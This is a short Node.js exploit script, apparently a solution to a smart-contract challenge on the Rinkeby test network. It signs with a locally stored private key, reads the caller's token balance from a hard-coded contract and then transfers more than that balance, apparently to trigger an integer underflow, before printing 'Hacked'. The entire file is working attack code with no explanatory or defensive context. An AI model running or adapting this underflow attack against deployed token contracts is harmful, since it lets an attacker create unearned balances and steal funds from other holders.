require("dotenv").config();
const fs = require("fs");
const Web3 = require("web3");
const HDWalletProvider = require("@truffle/hdwallet-provider");

const INFURA_PROJECT_ID = process.env.INFURA_PROJECT_ID;

const infuraURL = `https://rinkeby.infura.io/v3/${INFURA_PROJECT_ID}`;
const privateKey = fs.readFileSync(".privatekey").toString().trim();
const web3 = new Web3(new HDWalletProvider(privateKey, infuraURL));
const abi = require("./build/contracts/Token.json").abi;

(async () => {
  try {
    let contract = new web3.eth.Contract(
      abi,
      "0x892458829c0DA16E974c26D30cBA80b1f6da00D7"
    );
    const balance = await contract.methods
      .balanceOf(process.env.WALLET_ADDRESS)
      .call({ from: process.env.WALLET_ADDRESS });
    await contract.methods
      .transfer("0x892458829c0DA16E974c26D30cBA80b1f6da00D7", balance + 5)
      .send({ from: process.env.WALLET_ADDRESS });
    console.log("Hacked");
  } catch (e) {
    console.log(e.message);
  }
})();
